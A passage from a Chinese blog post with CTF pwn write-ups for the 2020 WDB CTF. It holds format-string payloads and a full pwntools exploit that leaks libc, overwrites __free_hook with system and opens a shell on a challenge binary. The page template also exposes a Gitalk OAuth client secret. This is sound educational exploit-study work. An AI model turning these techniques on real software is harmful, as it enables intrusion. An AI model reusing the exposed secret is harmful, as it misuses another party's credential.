+<p>然后我们就可以通过<code>栈2</code>，修改<code>rand1</code>的值为<code>rand2</code>的值了。</p>
+</li>
+<li>
+<p>最后，通过<code>rand1 != rand2</code>的判断，get shell。</p>
+</li>
+</ul>
+<h4 id="2-EXP">2) EXP</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%*19$c%52$hn</span><br><span class="line">%*18$c%116$n</span><br></pre></td></tr></table></figure>
+<h2 id="3-朱雀组">3. 朱雀组</h2>
+<h3 id="1-魔法房间">1. 魔法房间</h3>
+<p>点击<a href="/2020/05/2020wdbctf/magicRoom" title="这里">这里</a>下载文件</p>
+<ul>
+<li>一道基础的UAF漏洞，自带后门函数</li>
+<li>无论是利用方式还是所使用的数据结构，该程序都和pwnable.tw里的hacknote题高度相同</li>
+<li>EXP略</li>
+</ul>
+<h3 id="2-云盾">2. 云盾</h3>
+<p>点击<a href="/2020/05/2020wdbctf/%E4%BA%91%E7%9B%BE" title="这里">这里</a>下载文件</p>
+<h4 id="1-易知信息-4">1) 易知信息</h4>
+<ul>
+<li>程序提供了以下几条命令
+<ol>
+<li><code>ls</code> - 输出 ‘flag pwn 1 2’</li>
+<li>vim系列
+<ol>
+<li><code>vim 1</code> - 向一块malloc出的地址(buf1) 写入数据</li>
+<li><code>vim 2</code> - 向另一块malloc出的地址(buf2) 写入数据</li>
+</ol>
+</li>
+<li>rm系列
+<ol>
+<li><code>rm 1</code> - 将buf1释放，free后没有重置buf1指针</li>
+<li><code>rm 2</code> - 将buf2释放，free后没有重置buf2指针</li>
+</ol>
+</li>
+<li>cat系列
+<ol>
+<li><code>cat 1</code> - 调用<code>puts</code>函数输出</li>
+<li><code>cat 2</code> - 调用<code>printf</code>函数输出。<strong>注意，存在格式化字符串漏洞</strong></li>
+</ol>
+</li>
+<li><code>ls</code> - 修改某个字符串为传入的“文件夹”名称</li>
+</ol>
+</li>
+</ul>
+<h4 id="2-分析-4">2) 分析</h4>
+<ul>
+<li>尽管程序free一块内存后没有将对应指针置为NULL，但此漏洞在这里无法利用</li>
+<li>程序中较为频繁的使用<code>strcpy</code>危险函数，但输入长度已被限制，无法通过该函数进行溢出</li>
+<li>程序在free内存前，会进行内存检查。查看当前chunk的PREV_SIZE是否为NULL。如果不是，则程序判定为内存泄露，进行相应的修复操作</li>
+<li>程序在格式化字符串漏洞前，进行了传入字符串的相关检查。判断字符串中是否出现<code>%n</code>、<code>%h</code>、<code>%x</code>。若出现，则程序判定为攻击，不执行printf函数
+<blockquote>
+<p>这个字符串的检查相当的鸡肋，原因是在该漏洞的利用中，百分号后面大概率紧跟着数字。例如 <strong>%16hhn</strong>`</p>
+</blockquote>
+</li>
+<li>根据以上信息，我们可以尝试通过格式化字符串，将<code>__free_hook</code>改为<code>system</code>地址，并通过执行<code>free(&quot;/bin/sh&quot;)</code>来获取shell.
+<ol>
+<li>我们可以通过格式化字符串，泄露<code>__libc_start_main_ret</code>地址，得到libc的版本，并进一步计算<code>system</code>地址和<code>__free_hook</code>地址。为接下来的操作做准备。</li>
+<li>由于输入的字符串在堆上，故没办法通过 <em>输入字符串里的地址</em> 来定向修改数据<br>
+但通过观察栈上数据，我们可以发现，输入的命令存放在栈上<br>
+<img src="/2020/05/2020wdbctf/cloudProtect_stack.png" alt="img"><br>
+所以我们可以在该命令后面加上__free_hook的地址，来定向修改__free_hook<br>
+<img src="/2020/05/2020wdbctf/cloudProtect_stack_freeHook.png" alt="img"></li>
+<li>由于该程序中指针占用八个字节，如果直接修改数据，势必会输出大量无用信息（大约几个G左右）<br>
+所以需要分批修改。每次使用<code>%11hhn</code>修改一个字节，修改6次即可完成目标。<br>
+当然，__free_hook的地址也要加上对应的偏移<br>
+<img src="/2020/05/2020wdbctf/cloudProtect_stack_freeHook_offset.png" alt="img"></li>
+</ol>
+</li>
+</ul>
+<h4 id="3-EXP-2">3) EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./cloudProtect"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(payload, addr=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"vim 2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"cat 2"</span> + cyclic(<span class="number">3</span>) + p64(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">gdb.attach(io, <span class="string">"b* $rebase(0xFB5)"</span>)</span><br><span class="line">fmt(<span class="string">"%35$p\n"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = int(io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].replace(<span class="string">"&gt; "</span>, <span class="string">""</span>), <span class="number">16</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'__libc_start_main_ret'</span>, libc_start_main_ret)</span><br><span class="line">libc_base = libc_start_main_ret - obj.dump(<span class="string">'__libc_start_main_ret'</span>)</span><br><span class="line">log.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + obj.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify free_hook</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    fmt(<span class="string">"%&#123;&#125;c%11$hhn"</span>.format(u8(p64(system_addr)[i])), free_hook + i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getShell</span></span><br><span class="line">fmt(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"rm 2"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/05/2020wdbctf/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/05/STL_learning/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            SGI STL源码学习
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/heap-14-house/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">heap - 14 - house漏洞</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
